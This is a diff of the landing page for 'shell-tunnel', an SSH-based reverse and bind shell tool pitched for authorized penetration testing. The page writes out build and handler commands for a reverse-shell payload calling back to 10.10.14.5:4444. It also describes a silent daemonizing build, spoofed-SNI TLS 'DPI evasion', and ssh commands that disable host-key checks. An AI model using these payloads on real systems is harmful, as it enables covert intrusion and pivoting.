@@ -24,36 +24,42 @@
 <link rel="preload" href="fonts/big-shoulders-stencil-latin.woff2" as="font" type="font/woff2" crossorigin>
 <link rel="preload" href="fonts/azeret-mono-latin.woff2" as="font" type="font/woff2" crossorigin>
 <script>
-    // Dark (LX 263) default; opt-in light (LX 512) synced via rfs-theme and color-scheme across RFS pages.
+    // LX 263 Dark default; opt-in LX 512 Light synced via rfs-theme and color-scheme across RFS pages.
     (function (d) {
         try {
             var t = localStorage.getItem('rfs-theme') || localStorage.getItem('color-scheme');
-            if (t === 'light' || t === 'dayshift') d.dataset.theme = 'light';
+            if (t === 'light' || t === 'dayshift') {
+                d.dataset.theme = 'light';
+                var cs = d.querySelector('meta[name="color-scheme"]');
+                if (cs) cs.content = 'light';
+                var tc = d.querySelector('meta[name="theme-color"]');
+                if (tc) tc.content = '#F5F7F9';
+            }
         } catch (e) {}
-        if (window.matchMedia && matchMedia('(prefers-reduced-motion: no-preference)').matches) d.classList.add('js-run');
     })(document.documentElement);
 </script>
 <link rel="stylesheet" href="rfs.css">
 <link rel="stylesheet" href="rfs-components.css">
 <link rel="stylesheet" href="styles.css">
 </head>
-<body class="rfs-shell is-tunnel">
-<a class="rfs-skip" href="#build">Skip to the build line</a>
+<body class="rfs-shell">
+<a class="rfs-skip" href="#topology">Skip to pivot topology and binary baker</a>
 
-<header class="rfs-shell-header top">
-    <div class="wrap top-inner">
+<header class="rfs-shell-header site-header">
+    <div class="wrap header-inner">
         <a class="brand" href="https://real-fruit-snacks.github.io/">
             <img class="brand-tile" src="icon.svg" alt="" width="28" height="28">
             <span class="brand-text">SHELL-TUNNEL</span>
         </a>
-        <nav class="top-nav" aria-label="Links">
-            <a href="#what">What's in it</a>
-            <a href="#tested">Tested on</a>
-            <a href="#issues">Known issues</a>
+        <nav class="site-nav" aria-label="Primary">
+            <a href="#topology">Topology</a>
+            <a href="#multiplexer">ControlMaster</a>
+            <a href="#flags">Flags</a>
+            <a href="#platforms">Platforms</a>
             <a href="https://github.com/Real-Fruit-Snacks/shell-tunnel">GitHub</a>
         </nav>
         <button class="theme-btn" type="button" id="theme" aria-pressed="false" aria-label="Switch to LX 512 light theme">
-            <span class="theme-dot" aria-hidden="true"></span>
+            <span class="theme-swatch" aria-hidden="true"></span>
             <span class="t-dark">LX 263 DARK</span>
             <span class="t-light">LX 512 LIGHT</span>
         </button>
@@ -61,152 +67,754 @@
 </header>
 
 <div class="rfs-scroll-region page-scroll" id="page-scroll">
-<main class="wrap stack">
-<section class="card first" aria-labelledby="top-h">
-    <p class="runhead"><b>shell-tunnel 1.4.2</b><span>Windows · Linux · macOS</span><span>Go, one static binary</span><span>GPLv3</span></p>
-    <div class="hero">
-        <div>
-            <h1 class="title" id="top-h">shell-tunnel</h1>
-            <p class="lead">Static SSH server for bind and reverse shells, PTY and SFTP</p>
-            <p class="sub">I wanted a tiny way to get a good reverse shell and a pivot without juggling listeners and tunnel syntax by hand. shell-tunnel is that errand as one static binary: credentials and connection details are baked in at build time, the target runs it, and a plain <code>ssh</code> client gets a full PTY, SFTP file transfer and all three kinds of port forwarding. Optional TLS wrapping hides the SSH banner inside what looks like HTTPS. It assumes you have written authorization for the target. shell-tunnel is the preservation fork of Ferdinor's undertow (2021), whose upstream repository is no longer public — same GPLv3, modernized and maintained. For authorized security testing only.</p>
-            <ol class="ck steps" id="errand-ck" aria-label="The errand, start to finish">
-                <li id="build" data-step="1" data-state="done"><span class="box" aria-hidden="true"></span><span class="ch">Build</span><span class="ld" aria-hidden="true"></span><span class="rs">Tuned binary</span>
-                    <div class="act"><div class="cmd"><code>./build.sh reverse 10.10.14.5:4444</code><button class="copy" type="button" data-copy="./build.sh reverse 10.10.14.5:4444">Copy</button></div>
-                    <div class="cmd"><code>./build.sh listen 8888</code><button class="copy" type="button" data-copy="./build.sh listen 8888">Copy</button></div></div>
-                    <p class="why">Needs Go and Make on the build box. The script cross-compiles Linux and Windows binaries with a fresh random password baked in, and writes a handler script for reverse mode. <code>--tls --sni login.microsoft.com</code> wraps the traffic, <code>--nocli --daemonize</code> bakes a silent self-backgrounding payload.</p></li>
-                <li data-step="2" data-state="done"><span class="box" aria-hidden="true"></span><span class="ch">Handler</span><span class="ld" aria-hidden="true"></span><span class="rs">Listening</span></li>
-                <li data-step="3" data-state="done"><span class="box" aria-hidden="true"></span><span class="ch">Deliver</span><span class="ld" aria-hidden="true"></span><span class="rs">Executed</span></li>
-                <li data-step="4" data-state="done"><span class="box" aria-hidden="true"></span><span class="ch">Callback</span><span class="ld" aria-hidden="true"></span><span class="rs">Received</span></li>
-                <li data-step="5" data-state="done"><span class="box" aria-hidden="true"></span><span class="ch">Session</span><span class="ld" aria-hidden="true"></span><span class="rs">PTY</span></li>
-            </ol>
-            <p class="closeout">One ssh client, full session</p>
+<main class="wrap page-main">
+
+    <!-- ==================== HERO & PIVOT WORKBENCH ==================== -->
+    <section class="hero-band" id="topology" aria-labelledby="hero-title">
+        <header class="hero-head">
+            <div class="token-row" aria-label="Project metadata">
+                <span class="rfs-badge b-steel"><span class="k">[ver]</span> 1.4.2</span>
+                <span class="rfs-badge b-beacon"><span class="k">[bin]</span> GO STATIC BINARY</span>
+                <span class="rfs-badge b-ok"><span class="k">[lic]</span> GPLV3</span>
+                <span class="rfs-badge b-warn"><span class="k">[scope]</span> AUTHORIZED TESTING ONLY</span>
+            </div>
+            <h1 class="hero-title" id="hero-title">SHELL-TUNNEL</h1>
+            <p class="hero-lead">Static SSH server for bind and reverse shells, PTY and SFTP</p>
+            <p class="hero-intro">
+                Bake credentials, callback routing, and optional TLS camouflage into one zero-CGO Go static binary.
+                Drop it on an authorized target and drive interactive PTY shells, SFTP file transfers, and
+                <code>-L</code> / <code>-R</code> / <code>-D</code> pivots straight from a stock <code>ssh</code> client
+                with nothing extra to install on your box. Preservation fork of
+                <a class="rfs-link-prose" href="https://github.com/Ferdinor">Ferdinor's undertow (2021)</a>
+                — same GPLv3 license, modernized Go crypto dependencies, and CI-verified static releases.
+                For authorized security testing with explicit written permission only.
+            </p>
+        </header>
+
+        <div class="workbench" id="workbench" data-mode="reverse" data-tls="false" data-nocli="false" data-daemonize="false" data-os="linux/amd64">
+            <div class="workbench-bar">
+                <div class="workbench-bar-left">
+                    <span class="rfs-badge b-steel"><span class="k">[topo]</span> LIVE PIVOT SCHEMATIC</span>
+                    <span class="workbench-route" id="topo-route-label">Target dials 10.10.14.5:4444 · Operator connects to 127.0.0.1:41827</span>
+                </div>
+                <div class="workbench-bar-right" aria-live="polite">
+                    <span class="rfs-badge b-ok" id="topo-mode-badge"><span class="k">[rev]</span> REVERSE CALLBACK</span>
+                    <span class="rfs-badge b-beacon" id="topo-tls-badge" hidden><span class="k">[tls]</span> HTTPS CAMOUFLAGE</span>
+                </div>
+            </div>
+
+            <!-- Interactive Vector Topology Diagram (CSS-variable themed for LX 263 Dark & LX 512 Light) -->
+            <div class="topo-stage">
+                <svg class="topo-svg" id="topo-svg" viewBox="0 0 980 284" role="img" aria-labelledby="topo-svg-title topo-svg-desc">
+                    <title id="topo-svg-title">Interactive shell-tunnel SSH pivot topology</title>
+                    <desc id="topo-svg-desc">Architectural diagram connecting Operator Box (Kali) through an Encrypted SSH Tunnel to Target Host (Static Binary), dynamically reflecting Reverse callback versus Bind listener mode and optional TLS wrapping.</desc>
+                    <defs>
+                        <pattern id="topo-grid" width="24" height="24" patternUnits="userSpaceOnUse">
+                            <path d="M 24 0 L 0 0 0 24" fill="none" class="svg-grid-line" stroke-width="1"/>
+                        </pattern>
+                        <linearGradient id="topo-horizon" x1="0" y1="0" x2="1" y2="0">
+                            <stop offset="0%" class="svg-stop-steel"/>
+                            <stop offset="52%" class="svg-stop-steel-mid"/>
+                            <stop offset="100%" class="svg-stop-beacon"/>
+                        </linearGradient>
+                        <marker id="arrow-beacon" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+                            <path d="M 1 1.5 L 8.5 5 L 1 8.5 z" class="svg-arrow-beacon"/>
+                        </marker>
+                        <marker id="arrow-steel" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+                            <path d="M 1 1.5 L 8.5 5 L 1 8.5 z" class="svg-arrow-steel"/>
+                        </marker>
+                        <marker id="arrow-mint" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+                            <path d="M 1 1.5 L 8.5 5 L 1 8.5 z" class="svg-arrow-mint"/>
+                        </marker>
+                    </defs>
+
+                    <!-- Subtle architectural backdrop grid -->
+                    <rect x="0" y="0" width="980" height="284" fill="url(#topo-grid)"/>
+
+                    <!-- ==================== LEFT NODE: OPERATOR BOX ==================== -->
+                    <g class="topo-node topo-node-op">
+                        <rect x="16" y="20" width="276" height="244" rx="8" class="svg-node-bg svg-stroke-steel"/>
+                        <rect x="16" y="20" width="276" height="3" rx="1.5" class="svg-bar-steel"/>
+                        <text x="30" y="45" class="svg-kicker svg-fill-steel">[01] OPERATOR BOX (KALI)</text>
+                        <text x="30" y="65" class="svg-node-sub">Stock OpenSSH · zero client install</text>
+                        <line x1="30" y1="78" x2="278" y2="78" class="svg-divider"/>
+
+                        <!-- Operator Port Slot 1 -->
+                        <rect x="30" y="92" width="248" height="62" rx="5" class="svg-slot-bg svg-stroke-line"/>
+                        <text x="42" y="112" class="svg-slot-label" id="svg-op-slot1-label">HANDLER CALLBACK LISTENER</text>
+                        <text x="42" y="138" class="svg-port svg-fill-beacon" id="svg-op-slot1-port">0.0.0.0:4444</text>
+
+                        <!-- Operator Port Slot 2 -->
+                        <rect x="30" y="166" width="248" height="82" rx="5" class="svg-slot-bg svg-stroke-mint"/>
+                        <text x="42" y="186" class="svg-slot-label" id="svg-op-slot2-label">ALLOCATED LOOPBACK BIND</text>
+                        <text x="42" y="212" class="svg-port svg-fill-mint" id="svg-op-slot2-port">127.0.0.1:41827</text>
+                        <text x="42" y="234" class="svg-slot-meta" id="svg-op-slot2-meta">/tmp/shell-tunnel-41827.sock</text>
+
+                        <!-- Conduit anchor ports aligned dead-center with flow arrows -->
+                        <circle cx="292" cy="128" r="4.5" class="svg-port-dot svg-dot-beacon" id="svg-op-dot-top"/>
+                        <circle cx="292" cy="180" r="4.5" class="svg-port-dot svg-dot-mint" id="svg-op-dot-bot"/>
+                    </g>
+
+                    <!-- ==================== CENTER CONDUIT: SSH + OPTIONAL TLS SHEATH ==================== -->
+                    <g class="topo-conduit">
+                        <!-- Optional TLS Wrapper Sheath (highlights when --tls is active) -->
+                        <g class="topo-tls-sheath" id="svg-tls-sheath">
+                            <rect x="312" y="26" width="356" height="232" rx="8" class="svg-tls-box"/>
+                            <rect x="326" y="38" width="112" height="22" rx="4" class="svg-tls-tag-bg"/>
+                            <text x="382" y="53" text-anchor="middle" class="svg-tls-tag-text">[TLS WRAPPER]</text>
+                            <text x="448" y="53" class="svg-tls-meta">SNI: www.microsoft.com</text>
+                            <text x="490" y="244" text-anchor="middle" class="svg-tls-meta">ALPN: h2, http/1.1 · hides SSH banner</text>
+                        </g>
+
+                        <!-- Inner Encrypted SSH Conduit Box -->
+                        <rect x="328" y="76" width="324" height="142" rx="6" class="svg-conduit-bg"/>
+                        <rect x="328" y="76" width="324" height="2.5" fill="url(#topo-horizon)"/>
+                        <text x="490" y="98" text-anchor="middle" class="svg-conduit-title" id="svg-conduit-title">ENCRYPTED SSH TUNNEL</text>
+
+                        <!-- Flow Paths: Reverse vs Bind -->
+                        <g id="svg-flow-reverse">
+                            <line x1="684" y1="128" x2="302" y2="128" class="svg-flow-line svg-flow-beacon" marker-end="url(#arrow-beacon)"/>
+                            <text x="490" y="120" text-anchor="middle" class="svg-flow-label svg-fill-beacon" id="svg-rev-top-label">dial home :4444 (retry 5s · keepalive 15s)</text>
+
+                            <line x1="296" y1="180" x2="678" y2="180" class="svg-flow-line svg-flow-mint" marker-end="url(#arrow-mint)"/>
+                            <text x="490" y="172" text-anchor="middle" class="svg-flow-label svg-fill-mint">ssh 127.0.0.1:41827 → PTY · SFTP · -L/-R/-D</text>
+                            <text x="490" y="204" text-anchor="middle" class="svg-flow-sub">rs-info reports user@host · zero known_hosts</text>
+                        </g>
+
+                        <g id="svg-flow-bind" class="svg-hidden">
+                            <line x1="296" y1="128" x2="678" y2="128" class="svg-flow-line svg-flow-steel" marker-end="url(#arrow-steel)"/>
+                            <text x="490" y="120" text-anchor="middle" class="svg-flow-label svg-fill-steel" id="svg-bind-top-label">ssh -p 8888 svc@target (direct TCP)</text>
+
+                            <line x1="684" y1="180" x2="302" y2="180" class="svg-flow-line svg-flow-mint" marker-end="url(#arrow-mint)"/>
+                            <text x="490" y="172" text-anchor="middle" class="svg-flow-label svg-fill-mint">OpenSSH_8.9 → PTY · SFTP · -L/-R/-D</text>
+                            <text x="490" y="204" text-anchor="middle" class="svg-flow-sub">constant-time pass or baked ED25519 pubkey</text>
+                        </g>
+                    </g>
+
+                    <!-- ==================== RIGHT NODE: TARGET HOST ==================== -->
+                    <g class="topo-node topo-node-target">
+                        <rect x="688" y="20" width="276" height="244" rx="8" class="svg-node-bg svg-stroke-beacon"/>
+                        <rect x="688" y="20" width="276" height="3" rx="1.5" class="svg-bar-beacon"/>
+                        <text x="702" y="45" class="svg-kicker svg-fill-beacon">[02] TARGET HOST</text>
+                        <text x="702" y="65" class="svg-node-sub" id="svg-target-os-sub">linux/amd64 · static binary · openpty</text>
+                        <line x1="702" y1="78" x2="950" y2="78" class="svg-divider"/>
+
+                        <!-- Target Role Slot -->
+                        <rect x="702" y="92" width="248" height="62" rx="5" class="svg-slot-bg svg-stroke-line"/>
+                        <text x="714" y="112" class="svg-slot-label" id="svg-tgt-slot1-label">OUTBOUND CALLBACK TARGET</text>
+                        <text x="714" y="138" class="svg-port svg-fill-beacon" id="svg-tgt-slot1-port">10.10.14.5:4444</text>
+
+                        <!-- Target Baked Payload Flags Slot -->
+                        <rect x="702" y="166" width="248" height="82" rx="5" class="svg-slot-bg svg-stroke-line"/>
+                        <text x="714" y="186" class="svg-slot-label">BAKED PAYLOAD PROFILE</text>
+                        <text x="714" y="211" class="svg-slot-val" id="svg-tgt-profile-line">CLI on · foreground</text>
+                        <text x="714" y="234" class="svg-slot-meta" id="svg-tgt-binary-name">artifact: *-linux-x64</text>
+
+                        <!-- Conduit anchor ports aligned dead-center with flow arrows -->
+                        <circle cx="688" cy="128" r="4.5" class="svg-port-dot svg-dot-beacon" id="svg-tgt-dot-top"/>
+                        <circle cx="688" cy="180" r="4.5" class="svg-port-dot svg-dot-mint" id="svg-tgt-dot-bot"/>
+                    </g>
+                </svg>
+            </div>
+
+            <!-- ==================== INTERACTIVE BINARY BAKER BAR ==================== -->
+            <div class="baker-panel" aria-label="Interactive binary baker">
+                <div class="baker-controls">
+                    <div class="control-group">
+                        <span class="control-label" id="lbl-mode">Connection mode</span>
+                        <div class="seg-group" role="group" aria-labelledby="lbl-mode">
+                            <button type="button" class="seg-btn" data-set-mode="reverse" aria-pressed="true">
+                                <span class="k">[rev]</span> Reverse callback
+                            </button>
+                            <button type="button" class="seg-btn" data-set-mode="listen" aria-pressed="false">
+                                <span class="k">[bind]</span> Bind listener
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="control-group">
+                        <span class="control-label" id="lbl-opts">Bake options (ldflags)</span>
+                        <div class="chip-group" role="group" aria-labelledby="lbl-opts">
+                            <button type="button" class="rfs-chip baker-chip" data-toggle-opt="tls" aria-pressed="false">
+                                <span class="k">[tls]</span> --tls
+                            </button>
+                            <button type="button" class="rfs-chip baker-chip" data-toggle-opt="nocli" aria-pressed="false">
+                                <span class="k">[cli]</span> --nocli
+                            </button>
+                            <button type="button" class="rfs-chip baker-chip" data-toggle-opt="daemonize" aria-pressed="false">
+                                <span class="k">[bg]</span> --daemonize
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="control-group">
+                        <span class="control-label" id="lbl-os">Target OS / arch</span>
+                        <div class="chip-group" role="group" aria-labelledby="lbl-os">
+                            <button type="button" class="rfs-chip baker-chip" data-set-os="linux/amd64" aria-pressed="true">
+                                <span class="k">[os]</span> linux/amd64
+                            </button>
+                            <button type="button" class="rfs-chip baker-chip" data-set-os="windows/amd64" aria-pressed="false">
+                                <span class="k">[os]</span> windows/amd64
+                            </button>
+                            <button type="button" class="rfs-chip baker-chip" data-set-os="darwin/arm64" aria-pressed="false">
+                                <span class="k">[os]</span> darwin/arm64
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Live Generated Command Card -->
+                <div class="rfs-code-card baker-code-card">
+                    <div class="rfs-code-head">
+                        <div class="code-head-left">
+                            <span class="rfs-badge b-beacon"><span class="k">[shell]</span> BUILD COMMAND</span>
+                            <span class="rfs-code-head-meta" id="baker-cmd-meta">build.sh · reverse · linux/amd64</span>
+                        </div>
+                        <button type="button" class="rfs-btn rfs-btn-horizon copy-btn" command="--copy" commandfor="baker-cmd" aria-label="Copy generated build command">
+                            <svg class="rfs-icon rfs-icon-sm" aria-hidden="true"><use href="rfs-icons.svg#rfs-i-copy"/></svg>
+                            <span class="copy-label">Copy</span>
+                        </button>
+                    </div>
+                    <pre class="rfs-code-block"><code id="baker-cmd"><span class="rfs-tok-fn">./build.sh</span> <span class="rfs-tok-kw">reverse</span> <span class="rfs-tok-num">10.10.14.5:4444</span></code></pre>
+                </div>
+
+                <!-- Paired Verbatim Runtime Status & Output Telemetry Strip -->
+                <div class="telemetry-strip">
+                    <div class="telemetry-box">
+                        <span class="telemetry-head">Verbatim runtime status</span>
+                        <div class="status-lines" id="baker-status-lines" aria-live="polite">
+                            <p class="status-line"><span class="st-ok">[ok]</span> listening on 0.0.0.0:4444</p>
+                            <p class="status-line"><span class="st-ok">[ok]</span> listening at home on 127.0.0.1:41827</p>
+                        </div>
+                    </div>
+                    <div class="telemetry-box">
+                        <span class="telemetry-head" id="baker-out-head">Generated artifacts in bin/</span>
+                        <div class="artifact-lines" id="baker-artifacts">
+                            <p class="artifact-line"><code>bin/shell-tunnel-10-10-14-5-4444-linux-x64</code> <span class="artifact-note">(plus linux-x86, windows-x64/x86)</span></p>
+                            <p class="artifact-line"><code>bin/handler-10-10-14-5-4444</code> <span class="artifact-note">(chmod 700 · starts listener + prints connect commands)</span></p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ==================== CONTROLMASTER MULTIPLEXER BAY ==================== -->
+    <section class="section-band" id="multiplexer" aria-labelledby="mux-title">
+        <div class="section-head">
+            <span class="rfs-badge b-steel"><span class="k">[mux]</span> SINGLE SOCKET · FOUR CHANNELS</span>
+            <h2 class="section-title" id="mux-title">ControlMaster Multiplexer Bay</h2>
+            <p class="section-lead">
+                When a callback lands on loopback port <code>41827</code>, the handler prints two paste-ready commands.
+                Open one authenticated OpenSSH ControlMaster socket at <code>/tmp/shell-tunnel-41827.sock</code>, then
+                multiplex PTY shells, SFTP file transfers, TCP port forwards, and a SOCKS5 proxy over the same tunnel —
+                using stock <code>ssh</code> and <code>sftp</code>.
+            </p>
         </div>
 
-        <figure class="display" aria-labelledby="session-cap">
-            <div class="screenbox">
-                <p class="bar" aria-hidden="true"><b>A lab run</b><span>zsh · kali</span></p>
-<pre class="screen" id="screen" tabindex="0" aria-label="A shell-tunnel run: build a tuned binary, start the handler, catch the callback, ssh in"><code><span class="ln"><span class="p">$</span> <span class="t">./build.sh reverse 10.10.14.5:4444</span></span>
-<span class="ln o">[i] Mode:     reverse</span>
-<span class="ln o">[i] Target:   svc@10.10.14.5:4444</span>
-<span class="ln o">[i] BindPort: random (allocated by SSH server)</span>
-<span class="ln" data-step="1"><span class="s">[ok]</span> Build completed!</span>
-<span class="ln a">[!] Password: 9f2c71aa4b03d1e2</span>
-
-<span class="ln"><span class="p">$</span> <span class="t">./bin/handler-10-10-14-5-4444</span></span>
-<span class="ln o">[i] Listening on port:  4444</span>
-<span class="ln o">[i] Expecting callback: 10.10.14.5</span>
-<span class="ln" data-step="2"><span class="s">[ok]</span> listening on 0.0.0.0:4444</span>
-<span class="ln o" data-step="3">··· shell-tunnel.exe runs on the target ···</span>
-<span class="ln" data-step="4"><span class="s">[ok]</span> Session 1: svc on web01 (from 10.10.11.23), reachable via 127.0.0.1:41827</span>
-<span class="ln o">[i] 1. Create the master socket (run once):</span>
-<span class="ln o">ssh -fNM -S /tmp/shell-tunnel-41827.sock -p 41827 svc@127.0.0.1 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=10 -o ExitOnForwardFailure=yes</span>
-
-<span class="ln o">[i] 2. Connect through that socket:</span>
-<span class="ln o">ssh -S /tmp/shell-tunnel-41827.sock -p 41827 svc@127.0.0.1</span>
-
-<span class="ln"><span class="p">$</span> <span class="t">ssh -fNM -S /tmp/shell-tunnel-41827.sock -p 41827 svc@127.0.0.1 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=10 -o ExitOnForwardFailure=yes</span></span>
-<span class="ln"><span class="p">$</span> <span class="t">ssh -S /tmp/shell-tunnel-41827.sock -p 41827 svc@127.0.0.1</span></span>
-<span class="ln o">svc@127.0.0.1's password:</span>
-<span class="ln" data-step="5"><span class="q">svc@web01:~$</span> <span class="t">id</span></span>
-<span class="ln o">uid=1000(svc) gid=1000(svc) groups=1000(svc),27(sudo)</span>
-
-<span class="ln end"><span class="p">$</span> <span class="cursor"></span></span></code></pre>
+        <div class="mux-bay" id="mux-bay">
+            <div class="mux-socket-bar">
+                <span class="rfs-badge b-ok"><span class="k">[sock]</span> /tmp/shell-tunnel-41827.sock</span>
+                <span class="mux-socket-meta">Auth once · 60s ServerAlive × 10 (10m VPN tolerance) · per-run key skips ~/.ssh/known_hosts</span>
             </div>
-            <figcaption id="session-cap">
-                <p class="cap">A scripted run against a throwaway lab target. The password is baked into the binary at build time and printed by the build script. The listener numbers each callback and prints two commands: the ControlMaster (run once, then SFTP and forwards share the one authenticated connection) and the interactive session over that socket — stock <code>ssh</code>, nothing to install on the operator side.</p>
-                <button class="replay" type="button" data-replay="screen" hidden>Replay</button>
-            </figcaption>
-        </figure>
-    </div>
-</section>
 
-<section class="card ref" id="ssh-options" aria-labelledby="ssh-options-h">
-    <h2 id="ssh-options-h">The master command's <code>-o</code> options</h2>
-    <p class="intro">Five OpenSSH client options make the first command paste-and-run and resilient to dropped connections. <strong>The first two disable normal host-identity verification:</strong> use them only on controlled networks and targets you are authorized to test.</p>
-    <div class="cols">
-        <ul class="ck spec">
-            <li><span class="ch"><code>UserKnownHostsFile</code></span><span class="ld" aria-hidden="true"></span><span class="rs"><code>/dev/null</code></span>
-                <p class="why">Uses <code>/dev/null</code> instead of your user <code>known_hosts</code> file. The listener's temporary host key is not saved there, so later runs do not inherit stale entries.</p></li>
-            <li><span class="ch"><code>StrictHostKeyChecking</code></span><span class="ld" aria-hidden="true"></span><span class="rs"><code>no</code></span>
-                <p class="why">Accepts the listener's host key without asking. That is convenient for an ephemeral lab server, but there is no normal host-identity check to warn you about a man-in-the-middle.</p></li>
-            <li><span class="ch"><code>ServerAliveInterval</code></span><span class="ld" aria-hidden="true"></span><span class="rs"><code>60</code></span>
-                <p class="why">When no data has arrived from the server for 60 seconds, ssh sends an encrypted keepalive request. This keeps NAT and stateful-firewall mappings warm and helps detect dead connections.</p></li>
-        </ul>
-        <ul class="ck spec">
-            <li><span class="ch"><code>ServerAliveCountMax</code></span><span class="ld" aria-hidden="true"></span><span class="rs"><code>10</code></span>
-                <p class="why">Disconnects after 10 consecutive keepalives go unanswered. At one per 60 seconds, ssh waits roughly ten minutes without a response before giving up.</p></li>
-            <li><span class="ch"><code>ExitOnForwardFailure</code></span><span class="ld" aria-hidden="true"></span><span class="rs"><code>yes</code></span>
-                <p class="why">Exits if a forwarding requested at startup cannot be established, instead of leaving a connection that only looks ready. The base command has no forwards; this matters when you add <code>-L</code>, <code>-R</code> or <code>-D</code> to the master command.</p></li>
-        </ul>
-    </div>
-</section>
+            <div class="rfs-tablist mux-tablist" role="tablist" focusgroup="tablist nomemory" aria-label="ControlMaster multiplexed channels">
+                <button type="button" class="mux-tab" role="tab" id="tab-pty" aria-selected="true" tabindex="0" focusgroupstart>
+                    <span class="tab-idx">[01]</span> PTY Shell
+                </button>
+                <button type="button" class="mux-tab" role="tab" id="tab-sftp" aria-selected="false" tabindex="-1">
+                    <span class="tab-idx">[02]</span> SFTP Transfer
+                </button>
+                <button type="button" class="mux-tab" role="tab" id="tab-fwd" aria-selected="false" tabindex="-1">
+                    <span class="tab-idx">[03]</span> -L / -R Forward
+                </button>
+                <button type="button" class="mux-tab" role="tab" id="tab-socks" aria-selected="false" tabindex="-1">
+                    <span class="tab-idx">[04]</span> -D SOCKS5 Proxy
+                </button>
+            </div>
 
-<section class="card ref" id="what" aria-labelledby="what-h">
-    <h2 id="what-h">What's in it</h2>
-    <p class="intro">One binary covers both directions. Every status line starts with a bracketed tag — <code>[ok]</code>, <code>[!]</code>, <code>[x]</code>, <code>[i]</code> — so output stays meaningful piped or with <code>NO_COLOR</code> set. See the <a href="https://github.com/Real-Fruit-Snacks/shell-tunnel/blob/main/docs/USAGE.md">usage and build guide</a> for all flags and ldflags options.</p>
-    <div class="cols">
-        <ul class="ck spec">
-            <li><span class="ch">Reverse shells</span><span class="ld" aria-hidden="true"></span><span class="rs"><code>reverse</code></span>
-                <p class="why">The binary dials home through egress firewalls, retrying every 5 seconds until the listener answers, and keeps the callback warm with SSH keepalives. Your listener asks for a bind port — random by default, pinned with <code>-b</code> — then numbers the session and prints the ControlMaster and connect commands, so <code>sftp</code> and all three forwardings share one authenticated connection. The auto-generated handler script starts the listener and shows the password.</p></li>
-            <li><span class="ch">Bind shells</span><span class="ld" aria-hidden="true"></span><span class="rs"><code>listen</code></span>
-                <p class="why">The binary listens on the target and you SSH straight to it. Same session features as reverse mode, nothing else to run.</p></li>
-            <li><span class="ch">Full PTY</span><span class="ld" aria-hidden="true"></span><span class="rs"><code>pty</code></span>
-                <p class="why">openpty on Linux, ConPTY on Windows 10 17763 and later — tab completion, job control and full-screen tools work, and terminal resizes follow your window on both platforms. Bash-less targets fall back to <code>/bin/sh</code>; older Windows can use an <code>ssh-shellhost.exe</code> path via <code>-s</code>.</p></li>
-            <li><span class="ch">SFTP</span><span class="ld" aria-hidden="true"></span><span class="rs"><code>sftp</code></span>
-                <p class="why">A built-in subsystem on the same connection: <code>sftp -P 4444 svc@127.0.0.1</code> moves files without opening another channel or dropping tools on the target.</p></li>
-        </ul>
-        <ul class="ck spec">
-            <li><span class="ch">Port forwarding</span><span class="ld" aria-hidden="true"></span><span class="rs"><code>-L -R -D</code></span>
-                <p class="why">Local, remote and dynamic (SOCKS) forwarding through the stock ssh client — the session doubles as the pivot, which is the other half of why the tool exists.</p></li>
-            <li><span class="ch">TLS wrapping</span><span class="ld" aria-hidden="true"></span><span class="rs"><code>--tls</code></span>
-                <p class="why">Wraps SSH inside TLS with ALPN (<code>h2</code>, <code>http/1.1</code>) and a spoofed SNI (<code>--sni</code>, default <code>www.microsoft.com</code>), so the SSH banner never crosses the wire in plaintext. The certificate is self-signed at runtime — this is for DPI evasion, not authentication.</p></li>
-            <li><span class="ch">Baked builds</span><span class="ld" aria-hidden="true"></span><span class="rs"><code>--nocli</code></span>
-                <p class="why">Every knob — password, pubkey, shell, user, host, ports, TLS, daemonize — is an ldflags variable baked at build time. A <code>--nocli --daemonize</code> build has no flags to fumble on delivery and backgrounds itself on launch.</p></li>
-            <li><span class="ch">Two ways in</span><span class="ld" aria-hidden="true"></span><span class="rs"><code>auth</code></span>
-                <p class="why">Password (constant-time comparison) or an ED25519 authorized key baked with <code>-k</code>. Passwords are random per build unless pinned with <code>-p</code>.</p></li>
-        </ul>
-    </div>
-</section>
+            <div class="mux-panels">
+                <!-- Panel 1: PTY Shell -->
+                <div class="mux-panel" role="tabpanel" id="panel-pty" aria-labelledby="tab-pty">
+                    <div class="mux-panel-body">
+                        <div class="mux-panel-grid">
+                            <div class="mux-panel-code">
+                                <div class="rfs-code-card">
+                                    <div class="rfs-code-head">
+                                        <span class="rfs-badge b-steel"><span class="k">[shell]</span> 1. MASTER SOCKET (RUN ONCE)</span>
+                                        <button type="button" class="rfs-btn rfs-btn-sm rfs-btn-outline copy-btn" command="--copy" commandfor="cmd-mux-master" aria-label="Copy ControlMaster setup command">
+                                            <svg class="rfs-icon rfs-icon-sm" aria-hidden="true"><use href="rfs-icons.svg#rfs-i-copy"/></svg>
+                                            <span class="copy-label">Copy</span>
+                                        </button>
+                                    </div>
+                                    <pre class="rfs-code-block"><code id="cmd-mux-master"><span class="rfs-tok-fn">ssh</span> <span class="rfs-tok-kw">-fNM -S</span> <span class="rfs-tok-str">/tmp/shell-tunnel-41827.sock</span> <span class="rfs-tok-kw">-p</span> <span class="rfs-tok-num">41827</span> svc@127.0.0.1 \
+  <span class="rfs-tok-kw">-o</span> UserKnownHostsFile=<span class="rfs-tok-str">/dev/null</span> <span class="rfs-tok-kw">-o</span> StrictHostKeyChecking=<span class="rfs-tok-num">no</span> \
+  <span class="rfs-tok-kw">-o</span> ServerAliveInterval=<span class="rfs-tok-num">60</span> <span class="rfs-tok-kw">-o</span> ServerAliveCountMax=<span class="rfs-tok-num">10</span> <span class="rfs-tok-kw">-o</span> ExitOnForwardFailure=<span class="rfs-tok-num">yes</span></code></pre>
+                                </div>
 
-<section class="card ref" id="tested" aria-labelledby="tested-h">
-    <h2 id="tested-h">Tested on</h2>
-    <p class="intro">Every check below runs on every commit; the pipeline is public in the repo. What hasn't been run says so.</p>
-    <div class="cols">
